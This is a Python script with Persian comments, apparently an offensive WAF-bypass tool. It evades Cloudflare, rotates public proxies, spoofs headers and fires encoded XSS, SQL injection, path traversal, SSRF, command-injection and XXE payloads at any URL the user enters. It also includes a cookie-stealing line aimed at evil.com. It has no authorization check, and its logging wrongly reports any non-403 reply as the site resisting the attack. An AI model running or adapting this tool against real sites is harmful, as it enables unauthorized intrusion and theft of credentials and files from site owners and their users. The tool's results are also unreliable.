import requests
import base64
import time
import random
import binascii
import logging
import asyncio
import aiohttp
from urllib.parse import urlparse, urlencode
from fake_useragent import UserAgent
from playwright.async_api import async_playwright  # تغییر به Async API
import cloudscraper

# تنظیمات لاگ‌گیری
logging.basicConfig(
    filename="waf_bypass_log.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# لیست پروکسی‌های عمومی
PUBLIC_PROXIES = [
    "http://85.215.64.49:80",
    "http://50.223.246.237:80",
    "http://50.174.7.159:80",
    "http://41.207.187.178:80",
    "http://18.133.16.21:80",
    "http://13.38.176.104:3128",
    "http://15.236.106.236:3128",
    "http://44.218.183.55:80",
    "http://44.195.247.145:80",
    "http://50.207.199.80:80",
    "http://50.207.199.83:80",
    "http://50.174.7.153:80",
    "http://50.202.75.26:80",
    "http://50.169.37.50:80",
    "http://50.232.104.86:80",
    "http://50.239.72.18:80",
    "http://50.175.212.66:80",
    "http://50.239.72.16:80",
    "http://50.239.72.19:80",
    "http://50.217.226.40:80",
    "http://50.175.212.74:80",
    "http://50.174.7.152:80",
    "http://66.191.31.158:80",
    "http://37.187.25.85:80",
    "http://184.169.154.119:80",
    "http://13.56.192.187:80",
    "http://202.6.233.133:80",
    "http://188.40.59.208:3128",
    "http://3.10.93.50:80",
    "http://200.174.198.86:8888",
    "http://13.208.56.180:80",
    "http://35.72.118.126:80",
    "http://104.238.160.36:80",
    "http://43.202.154.212:80",
    "http://35.76.62.196:80",
    "http://35.79.120.242:3128",
    "http://18.228.149.161:80",
    "http://18.185.169.150:3128",
    "http://3.127.121.101:80",
    "http://3.139.242.184:80",
    "http://43.200.77.128:3128",
    "http://43.201.121.81:80",
    "http://54.233.119.172:3128",
    "http://18.228.198.164:80",
    "http://3.78.92.159:3128",
    "http://52.67.10.183:80",
    "http://116.125.141.115:80",
    "http://45.144.64.153:8080",
]

# انتخاب تصادفی پروکسی
def get_random_proxy():
    if PUBLIC_PROXIES:
        return random.choice(PUBLIC_PROXIES)
    return None

# بایپس Cloudflare
def bypass_cloudflare(url):
    scraper = cloudscraper.create_scraper()
    try:
        response = scraper.get(url)
        logging.info(f"Cloudflare Bypass Success - {url} - Status Code: {response.status_code}")
        return response.text
    except Exception as e:
        logging.error(f"Cloudflare Bypass Failed: {e}")
        return None

# شبیه‌سازی رفتار انسانی در مرورگر (نسخه Async)
async def human_like_browsing(url):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await page.goto(url, wait_until="networkidle")
        await asyncio.sleep(random.uniform(3, 6))
        await page.mouse.move(random.randint(0, 500), random.randint(0, 500))
        await page.keyboard.type("random typing simulation", delay=random.uniform(50, 200))
        content = await page.content()
        await browser.close()
        logging.info(f"Human-like browsing completed for {url}")
        return content

# رمزگذاری Payloadها
def encode_payloads(payload):
    return {
        "Base64": base64.b64encode(payload.encode()).decode(),
        "Hex": binascii.hexlify(payload.encode()).decode(),
        "URL": urlencode({"data": payload})[5:],
        "Reversed": payload[::-1],
        "Unicode": payload.encode("unicode_escape").decode(),
        "Double URL": urlencode({"data": urlencode({"data": payload})})[5:],
        "HTML Entities": "".join(f"&#{ord(char)};" for char in payload),
    }

# لیست حملات پیشرفته
advanced_payloads = {
    "XSS": ["<script>alert(1)</script>", "\"'><script>alert(1)</script>"],
    "SQLI": ["' OR '1'='1' --", "' UNION SELECT null, username, password FROM users --"],
    "LFI": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
    "SSRF": ["http://127.0.0.1:8080/admin", "file:///etc/passwd"],
    "RCE": [";id;", "`cat /etc/passwd`", "$(id)"],
    "XXE": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
    "CSRF": ["<img src='http://evil.com/steal-cookie'>"],
    "SSTI": ["{{7*7}}", "<%= 7 * 7 %>"],
    "WebSocket Exploit": ["ws://malicious-site.com/payload"],
    "DNS Tunneling": ["https://cloudflare-dns.com/dns-query?name=target.com"]
}

# ارسال درخواست به‌صورت همزمان با asyncio
async def send_async_request(url, method, headers, payload, proxy=None):
    try:
        async with aiohttp.ClientSession() as session:
            proxy_url = proxy if proxy else None
            async with session.request(
                method, url, headers=headers, data=payload, proxy=proxy_url, timeout=10
            ) as response:
                return await response.text(), response.status
    except Exception as e:
        logging.error(f"❌ خطا در ارسال درخواست: {e}")
        return None, None

# تست WAF
async def test_waf_bypass(url):
    if not url.startswith("http"):
        url = "https://" + url

    logging.info(f"🔍 شروع تست WAF در {url} ...")
    bypass_cloudflare(url)
    await human_like_browsing(url)  # تغییر به نسخه Async

    for attack, payloads in advanced_payloads.items():
        logging.info(f"🚀 شروع حمله {attack} ...")
        tasks = []
        for payload in payloads:
            encoded_versions = encode_payloads(payload)
            for encoding, encoded_payload in encoded_versions.items():
                headers = {
                    "User-Agent": UserAgent().random,
                    "Referer": "https://trusted-site.com",
                    "X-Forwarded-For": "127.0.0.1",
                }
                proxy = get_random_proxy()
                task = send_async_request(
                    url, "POST", headers, {"param": encoded_payload}, proxy
                )
                tasks.append(task)

        results = await asyncio.gather(*tasks)
        for result in results:
            response_text, status_code = result
            if response_text and status_code:
                if status_code == 403:
                    logging.warning(f"⚠️ WAF درخواست را بلاک کرده است (کد وضعیت: {status_code}).")
                else:
                    logging.info(f"✅ سایت در برابر حمله مقاوم است (کد وضعیت: {status_code}).")

# اجرای اصلی
if __name__ == "__main__":
    target_url = input("🔹 URL را وارد کنید: ")
    asyncio.run(test_waf_bypass(target_url))
   